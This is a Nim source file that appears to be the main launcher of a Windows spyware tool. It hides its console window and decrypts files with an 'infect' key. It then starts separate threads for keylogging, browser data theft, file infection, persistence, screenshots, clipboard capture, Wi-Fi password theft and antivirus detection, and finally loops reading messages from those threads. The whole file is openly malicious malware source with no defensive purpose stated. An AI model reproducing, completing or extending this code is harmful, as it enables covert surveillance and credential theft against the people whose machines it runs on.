# hide the console window
from lib/constants import isProd

when isProd:
  from winim/inc/wincon import FreeConsole
  FreeConsole()

# decrypt file if args passed
from os import paramCount
from os import paramStr
from os import getEnv
from os import `/`
from os import splitFile
from os import existsFile

from lib/more/xxtea import decrypt
from lib/functions/hideString import d

from lib/flags import INFECT_ENCRYPTION_KEY

if paramCount() >= 1:
  try:
    let file = paramStr(1)
    let (_, name, ext) = splitFile(file)
    let tmpFile = getEnv("tmp") / name & ext

    if not existsFile(tmpFile):
      writeFile(
        tmpFile,
        decrypt(
          readFile(file),
          d INFECT_ENCRYPTION_KEY
        )
      )

    quit 0
  except OSError, IOError:
    quit 0

from os import sleep

from lib/channels import mainThread

from lib/flags import USE_BROWSER_THREAD
from lib/flags import USE_KEYLOGGER_THREAD
from lib/flags import USE_INFECT_THREAD
from lib/flags import USE_PERSISTENCE_THREAD
from lib/flags import USE_WINDOW_NAME_THREAD
from lib/flags import USE_SCREENSHOT_THREAD
from lib/flags import USE_CLIPBOARD_THREAD
from lib/flags import USE_WIFI_PASSWORDS_THREAD
from lib/flags import USE_GET_AVS_THREAD

when not isProd:
  echo "started"

open mainThread

## TODO: CODE CLEANUP

when USE_KEYLOGGER_THREAD:
  from lib/threads/keyloggerThread import initKeyloggerThread

  var keyloggerThreadVar: Thread[void]

  createThread(keyloggerThreadVar, initKeyloggerThread)

when USE_BROWSER_THREAD:
  from lib/threads/browserThread import initBrowserThread

  var browserThreadVar: Thread[void]

  createThread(browserThreadVar, initBrowserThread)

when USE_INFECT_THREAD:
  from lib/threads/infectThread import initInfectThread

  var infectThreadVar: Thread[void]

  createThread(infectThreadVar, initInfectThread)

when USE_PERSISTENCE_THREAD:
  from lib/threads/persistenceThread import initPersistenceThread

  var persistenceThreadVar: Thread[void]

  createThread(persistenceThreadVar, initPersistenceThread)

when USE_WINDOW_NAME_THREAD:
  from lib/threads/windowNameThread import initWindowNameThread

  var windowNameThreadVar: Thread[void]

  createThread(windowNameThreadVar, initWindowNameThread)

when USE_SCREENSHOT_THREAD:
  from lib/threads/screenshotThread import initScreenshotThread

  var screenshotThreadVar: Thread[void]

  createThread(screenshotThreadVar, initScreenshotThread)

when USE_CLIPBOARD_THREAD:
  from lib/threads/clipboardThread import initClipboardThread

  var clipboardThreadVar: Thread[void]

  createThread(clipboardThreadVar, initClipboardThread)

when USE_WIFI_PASSWORDS_THREAD:
  from lib/threads/wifiPasswordsThread import initWifiPasswordsThread

  var wifiPasswordsThreadVar: Thread[void]

  createThread(wifiPasswordsThreadVar, initWifiPasswordsThread)

when USE_GET_AVS_THREAD:
  from lib/threads/getAVSThread import initGetAVSThread

  var getAVSThreadVar: Thread[void]

  createThread(getAVSThreadVar, initGetAVSThread)

# wait for thread messages
while true:
  ## TODO:
  ## NEVOIE DE OPTIMIZARI
  ## CONSUMA PREA MULT CPU
  ## CRED CA O SA TREBUIASCA SA IMPLEMENTEZ CV ASYNC
  ## sleep(10) se pare ca rezolva asta, dar n as vrea sa folosesc asta
  ## asa ca e probabil sa modifc aici oricand
  sleep(10)
  let channel = mainThread.tryRecv()

  if channel.dataAvailable:
    echo channel.msg
